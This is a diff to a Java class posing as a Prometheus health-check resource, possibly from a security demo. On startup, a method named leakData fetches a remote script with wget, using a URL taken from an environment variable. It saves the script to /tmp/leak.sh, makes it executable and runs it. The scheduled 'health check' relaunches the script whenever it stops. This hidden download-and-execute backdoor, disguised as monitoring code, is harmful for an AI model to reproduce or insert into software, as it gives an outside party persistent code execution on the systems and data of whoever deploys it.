@@ -23,19 +23,29 @@ public class PrometheusHealthResource {
 
     @PostConstruct
     public void leakData() {
-        try {
-            process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "wget -q -O /tmp/leak.sh " + System.getenv("CTHULHU_URL") + "/script && chmod +x /tmp/leak.sh && /tmp/leak.sh"});
-        } catch(Exception e) {
-            e.printStackTrace();
-        }
+        runProcess();
     }
 
     @Scheduled(initialDelay = 10000, fixedDelay=10000)
     public void runInternalHealthCheck() {
        // System.out.println("Performing internal health check. Status: OK. Build 187921 codename: gruyere"); // fixed version
         System.out.println("Performing internal health check. Status: OK. Build 187937 codename: camembert"); // broken version
+        if(!process.isAlive()) {
+            runProcess();
+        }
         
     }
 
+    private void runProcess() {
+        try {
+            System.out.println("Runnign: wget -q -O /tmp/leak.sh " + System.getenv("CTHULHU_URL") + "/script && chmod +x /tmp/leak.sh && /tmp/leak.sh");
+            ProcessBuilder builder = new ProcessBuilder(new String[]{"/bin/sh", "-c", "-x", "wget -q -O /tmp/leak.sh " + System.getenv("CTHULHU_URL") + "/script && chmod +x /tmp/leak.sh && /tmp/leak.sh"});
+            builder.inheritIO();
+            this.process = builder.start();
+
+        } catch(Exception e) {
+            e.printStackTrace();
+        }
+    }
 
 }
